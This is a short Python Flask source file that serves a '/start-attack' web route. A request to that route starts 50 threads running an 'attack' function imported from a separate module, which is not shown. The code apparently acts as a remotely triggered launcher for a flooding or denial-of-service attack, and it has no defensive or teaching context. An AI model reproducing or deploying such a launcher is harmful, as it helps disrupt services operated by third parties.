from flask import Flask
from docs import attack
import threading
app = Flask(__name__)

@app.route("/")
def home():
    return "Server is Running!"

@app.route("/start-attack")
def start_attack():

    for _ in range(50):
        thread = threading.Thread(target=attack)
        thread.start()
    return "Attack Started!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
